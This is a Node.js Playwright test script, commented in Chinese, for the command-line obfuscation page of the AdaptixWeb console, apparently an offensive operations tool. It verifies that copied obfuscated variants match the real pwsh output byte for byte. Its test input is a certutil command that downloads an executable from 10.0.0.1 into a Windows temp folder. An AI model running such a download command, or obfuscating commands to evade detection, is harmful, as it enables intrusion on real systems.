#!/usr/bin/env node
/* 参数混淆页的**保真度**验收（离线）。
 *
 * ★ 安全：本脚本只导航、输入、量测，并读写**本页自己的**剪贴板。
 *   不登录任何真实控制台、不带任何凭据、不向任何主机下发任何东西。
 *
 * 为什么单独有这个脚本：`verify_argfuscator_ui.mjs` 证明的是「页面挂载得起来、
 * 接线接对了」，用的夹具是可读的 ASCII。但本页交付的东西是**一串不可读的字节**：
 * 变体里混着其他文种的字母、组合标记和不可见格式字符。操作员没法用眼睛验收，
 * 唯一的保真手段是复制。所以「屏幕上那串 == 服务端那串 == 剪贴板那串」必须
 * 单独量，而且夹具**必须来自 pwsh 的真实输出**（scripts/fixtures/），
 * 不能由人重新敲一遍 —— 否则量的是打字的保真度，不是页面的。
 *
 * ★ 最重要的一条是 Y5，不是 Y3。
 *   Y3 走的是「点复制按钮」→ copyText() → navigator.clipboard.writeText()。
 *   而操作员实际最常见的动作是**在页面上划选然后 Ctrl+C** —— 那条路拿到的是
 *   浏览器**渲染后**的文本，会经过 CSS 的 white-space / overflow-wrap 处理。
 *   `.axf-cmd` 是 `white-space: pre-wrap; overflow-wrap: anywhere`，长命令会折行。
 *   若折行会往选中的文本里塞进换行或空格，那「展示」与「实际」就是两串东西，
 *   而这恰恰是最难发现的一类失真：打字时是对的，肉眼看着也对。
 *
 * 判据：
 *   Y1  夹具自洽：来自 pwsh 的真字节，3 变体，每个 6 个空白分隔 token
 *   Y2  DOM textContent 与夹具**逐码点**相等（不是 `===` 就完 —— 要能报出第几位）
 *   Y3  「复制」按钮写入剪贴板的与夹具逐码点相等
 *   Y4  「复制全部」写入的 = 各变体以 \n 连接，逐码点相等
 *   Y5  ★页面**确实折行了**的前提下，「划选复制」拿到的（innerText）仍与
 *       textContent 相同 —— 不同即失真，且报出第一处差异
 *   Y6  字体覆盖报告：哪些码点没有字形（会显示成豆腐块）、哪些是零宽
 *
 * 用法（在 AdaptixWeb/ 下，先 npm run build）:
 *   node scripts/verify_argfuscator_fidelity.mjs
 */
import fs from 'node:fs'
import path from 'node:path'
import url from 'node:url'
import { launchConsole } from './_harness.mjs'

const __dirname = path.dirname(url.fileURLToPath(import.meta.url))
const FIXTURE = path.join(__dirname, 'fixtures', 'argfuscator_sample.bin')
const RS = String.fromCharCode(30)

let checks = 0
let fails = 0
function check(id, desc, pass, detail = '') {
  checks++
  console.log(`  ${pass ? '✓' : '✗'} ${id} ${desc}${detail ? ` | ${detail}` : ''}`)
  if (!pass) fails++
}

const hex = (c) => 'U+' + c.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')

/** 逐码点比较。`===` 只告诉你「不一样」，这里要告诉你**第几位不一样、各是什么**。 */
function cpsEq(a, b) {
  const A = [...a]
  const B = [...b]
  if (A.length !== B.length) {
    // 长度不同时也要指出第一处差异，否则「多了一个空格」和「全错」长得一样
    const n = Math.min(A.length, B.length)
    for (let i = 0; i < n; i++) {
      if (A[i] !== B[i]) return { ok: false, why: `长度 ${A.length} vs ${B.length}，第 ${i} 位起分歧：${hex(A[i])} vs ${hex(B[i])}` }
    }
    return { ok: false, why: `长度 ${A.length} vs ${B.length}，前 ${n} 位相同；多出的尾部：${JSON.stringify((A.length > B.length ? A : B).slice(n).join(''))}` }
  }
  for (let i = 0; i < A.length; i++) {
    if (A[i] !== B[i]) return { ok: false, why: `第 ${i} 位：${hex(A[i])} vs ${hex(B[i])}` }
  }
  return { ok: true, why: '' }
}

const STATUS = {
  ok: true, available: true, pwsh: '/usr/bin/pwsh', pwsh_version: '7.4.20',
  module_dir: '/root/cc/run/extenders/argfuscator', models: 156,
  commands: ['certutil', 'ipconfig', 'netstat', 'whoami', 'arp'],
  platforms: ['windows', 'linux', 'mac'], max_variants: 5, timeout_sec: 60,
}

const INPUT = 'certutil -urlcache -split -f http://10.0.0.1/a.exe C:\\Windows\\Temp\\A.exe'

async function main() {
  console.log('\n参数混淆页 保真度验收\n')

  if (!fs.existsSync(FIXTURE)) {
    console.log(`❌ 夹具不存在：${FIXTURE}\n   它必须来自 pwsh 的真实输出，不要手敲。\n`)
    process.exit(1)
  }
  const raw = fs.readFileSync(FIXTURE, 'utf8')
  const variants = raw.split(RS)

  // ── Y1 夹具自洽 ──
  const toks = variants.map((v) => v.trim().split(/\s+/).length)
  const wsOdd = variants.filter((v) => /:\s|\t|[\u00a0\u2000-\u200a\u202f\u205f\u3000]/.test(v))
  check('Y1', '夹具来自 pwsh 真字节、3 变体、各 6 个 token、无异常空白',
    variants.length === 3 && toks.every((n) => n === 6) && wsOdd.length === 0,
    `变体=${variants.length} token=${toks.join(',')} 异常空白=${wsOdd.length}`)

  // ── 起浏览器（必须授权剪贴板，否则 writeText 抛 → 静默退到 execCommand，Y3 就没意义了）──
  const h = await launchConsole({
    viewport: { width: 900, height: 760 },   // 窄视口：让长命令**一定**折行，Y5 才有内容
    permissions: ['clipboard-read', 'clipboard-write'],
    routes: {
      '/api/argfuscator/status': (route, body, json) => json(STATUS),
      '/api/argfuscator/generate': (route, body, json) =>
        json({ ok: true, count: variants.length, variants, ms: 1180 }),
    },
  })

  try {
    const page = h.page
    await h.gotoView('参数混淆')

    await page.fill('.axf-input', INPUT)
    await page.waitForTimeout(200)
    await page.click('.axf-run button')
    await page.waitForSelector('.axf-item', { timeout: 8000 })

    // ── Y2 DOM 与夹具逐码点相等 ──
    const dom = await page.$$eval('.axf-cmd', (els) => els.map((e) => e.textContent))
    if (dom.length !== variants.length) {
      check('Y2', 'DOM textContent 与夹具逐码点相等', false, `条数 ${dom.length} != ${variants.length}`)
    } else {
      const bad = dom.map((d, i) => [i, cpsEq(d, variants[i])]).filter(([, r]) => !r.ok)
      check('Y2', 'DOM textContent 与夹具逐码点相等',
        bad.length === 0,
        bad.length ? `第 ${bad[0][0] + 1} 条 ${bad[0][1].why}` : `${dom.length} 条全部一致`)
    }

    // ── Y5（先做，避免被后面的点击改动 DOM 状态）──
    // 折行必须**真的发生**，否则这条断言在测一个不存在的情形。
    const wrap = await page.$$eval('.axf-cmd', (els) => els.map((e) => {
      const lh = parseFloat(getComputedStyle(e).lineHeight) || 20
      return { lines: Math.round(e.getBoundingClientRect().height / lh), inner: e.innerText }
    }))
    const wrapped = wrap.filter((w) => w.lines > 1).length
    const selBad = wrap.map((w, i) => [i, cpsEq(w.inner, variants[i])]).filter(([, r]) => !r.ok)
    check('Y5', '★折行后「划选复制」拿到的仍是同一串（innerText == textContent）',
      wrapped > 0 && selBad.length === 0,
      `折行的变体 ${wrapped}/${wrap.length} 条` +
      (selBad.length ? `；第 ${selBad[0][0] + 1} 条失真：${selBad[0][1].why}` : '；选中文本逐码点一致'))

    // ── Y3 单条复制（挑含不可见字符的那条）──
    const invisIdx = variants.findIndex((v) => /[\p{Cf}\p{Cc}]/u.test(v))
    const pick = invisIdx >= 0 ? invisIdx : 0
    await page.click(`.axf-item >> nth=${pick} >> button.ghost`)
    await page.waitForTimeout(350)
    const clipOne = await page.evaluate(() => navigator.clipboard.readText())
    const r3 = cpsEq(clipOne, variants[pick])
    check('Y3', `「复制」写入剪贴板逐码点相等（第 ${pick + 1} 条${invisIdx >= 0 ? '，含不可见字符' : ''}）`,
      r3.ok, r3.ok ? `${[...clipOne].length} 个码点一致` : r3.why)

    // ── Y4 复制全部 ──
    const allBtn = await page.$('.axf-res-hd button.ghost')
    if (!allBtn) {
      check('Y4', '「复制全部」写入剪贴板逐码点相等', false, '找不到「复制全部」按钮')
    } else {
      await allBtn.click()
      await page.waitForTimeout(350)
      const clipAll = await page.evaluate(() => navigator.clipboard.readText())
      // 期望值不能写成「逐码点等于 join('\n')」：Windows 剪贴板就是 CRLF 惯例，
      // 浏览器在写系统剪贴板时会把 \n 归一成 \r\n（实测 331 vs 329，多出的正好是
      // 2 个分隔符对应的 2 个 CR）。那是平台约定，不是本页丢内容。
      //
      // 但也不能无脑 `replace(/\r\n/g,'\n')` 了事 —— 那样会连「变体内部被塞进换行」
      // 一起洗掉。所以：只归一成对出现的 CRLF，**落单的 \r 保留**，它照样会让比较失败。
      const crlf = (clipAll.match(/\r\n/g) || []).length
      const loneCr = (clipAll.match(/\r(?!\n)/g) || []).length
      const norm = clipAll.replace(/\r\n/g, '\n')
      const r4 = cpsEq(norm, variants.join('\n'))
      check('Y4', '「复制全部」内容逐码点相等（CRLF 归一后；落单 \\r 不算数）',
        r4.ok && loneCr === 0,
        r4.ok
          ? `${[...norm].length} 个码点一致；平台把 ${crlf} 处 \\n 写成 \\r\\n，落单 \\r ${loneCr} 个`
          : r4.why)
    }

    // ── Y6 字体覆盖（只作报告，不作判据）──
    //
    // ★ 这个度量有个会骗人的退化态，必须先自检再开口。
    //   「没有字形」是靠「与 U+FFFF 同宽」判的。可要是本环境根本没有可用的字体栈
    //   （headless 里很常见），**所有**码点都会量出同一个 advance —— 'M' 和 'c'
    //   也在内。这时判据会把整个 ASCII 报成豆腐块。第一版正是如此：报了 59/75，
    //   名单里赫然有 U+0063、U+0065。宁可说「本环境判不了」，也不能报一个必然错的数。
    const font = await page.evaluate((strs) => {
      const el = document.querySelector('.axf-cmd')
      const cv = document.createElement('canvas')
      const ctx = cv.getContext('2d')
      ctx.font = `20px ${getComputedStyle(el).fontFamily}`
      const w = (s) => ctx.measureText(s).width
      const notdef = w(String.fromCharCode(0xffff))  // 保证没有字形的哨兵码点
      const known = w('M')            // 一定有字形的参照
      if (Math.abs(known - notdef) < 0.01) return { degenerate: true, notdef, known }
      const seen = new Map()
      for (const s of strs) for (const ch of s) {
        if (seen.has(ch) || /\s/.test(ch)) continue
        seen.set(ch, w(ch))
      }
      const zero = [...seen].filter(([, x]) => x === 0).map(([c]) => c)
      const tofu = [...seen].filter(([, x]) => x > 0 && Math.abs(x - notdef) < 0.01).map(([c]) => c)
      return { degenerate: false, total: seen.size, zero, tofu }
    }, variants)

    if (font.degenerate) {
      console.log(`  · Y6 报告：**本环境判不了** —— 'M' 与 U+FFFF 同宽（都是 ${font.known}），` +
        '说明没有可用字体栈，量出来的「无字形」会覆盖整个 ASCII。跳过，不报数。')
    } else {
      console.log(`  · Y6 报告：本页字体栈共 ${font.total} 个非空白码点；` +
        `零宽 ${font.zero.length} 个；无字形(与 U+FFFF 同宽) ${font.tofu.length} 个` +
        (font.tofu.length ? ` → ${font.tofu.slice(0, 12).map(hex).join(' ')}` : ''))
    }
    console.log('      （只作报告：无字形只影响肉眼观感，不影响剪贴板字节 —— 那由 Y3/Y4 管）')

  } finally {
    await h.close()
  }

  console.log(`\n${fails === 0 ? '✅' : '❌'} ${checks - fails}/${checks} 通过\n`)
  process.exit(fails === 0 ? 0 : 1)
}

main().catch((e) => { console.error(e); process.exit(1) })
